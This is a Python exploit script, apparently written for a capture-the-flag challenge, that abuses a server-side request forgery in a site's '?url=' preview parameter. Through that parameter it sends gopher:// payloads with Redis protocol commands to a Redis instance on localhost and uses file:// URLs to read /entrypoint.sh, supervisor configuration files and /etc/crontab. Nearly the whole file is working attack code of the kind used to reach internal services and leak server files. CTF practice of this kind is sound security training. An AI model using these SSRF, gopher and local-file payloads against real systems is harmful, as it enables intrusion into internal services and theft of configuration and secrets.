import urllib.request
import urllib.parse
import re

BASE = 'https://991c635b-ctf.dsg.id/'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

def fetch(target_url):
    url = BASE + '?url=' + urllib.parse.quote(target_url)
    req = urllib.request.Request(url, headers={'User-Agent': UA})
    try:
        res = urllib.request.urlopen(req)
        html = res.read().decode()
        m = re.search(r'class="preview-content">(.*?)</div>', html, re.DOTALL)
        if m:
            return 'PREVIEW: ' + m.group(1).strip()[:2000]
        m = re.search(r'class="error-msg">(.*?)</div>', html, re.DOTALL)
        if m:
            return 'ERROR: ' + m.group(1).strip()
        return 'OTHER: len=' + str(len(html))
    except Exception as e:
        return f'EXCEPTION: {e}'

# Try gopher to Redis (port 6379) - send INFO command
# gopher format: gopher://host:port/_<data>
# Redis RESP: *1\r\n$4\r\nINFO\r\n
redis_info = "gopher://127.0.0.1:6379/_*1%0D%0A%244%0D%0AINFO%0D%0A"
print("=== Redis INFO via gopher ===")
print(fetch(redis_info))
print()

# Try simple PING
redis_ping = "gopher://127.0.0.1:6379/_*1%0D%0A%244%0D%0APING%0D%0A"
print("=== Redis PING via gopher ===")
print(fetch(redis_ping))
print()

# Try raw telnet-style commands (inline)
redis_raw = "gopher://127.0.0.1:6379/_PING%0D%0A"
print("=== Redis raw PING ===")
print(fetch(redis_raw))
print()

# Try reading entrypoint.sh for clues
print("=== /entrypoint.sh ===")
print(fetch('file:///entrypoint.sh'))
print()

# Try reading supervisor config
print("=== /etc/supervisor/conf.d ===")
for f in ['supervisord.conf', 'app.conf', 'redis.conf']:
    print(f'--- /etc/supervisor/conf.d/{f} ---')
    print(fetch(f'file:///etc/supervisor/conf.d/{f}'))
print()

# Check cron
print("=== /etc/cron.d/ files ===")
print(fetch('file:///etc/crontab'))
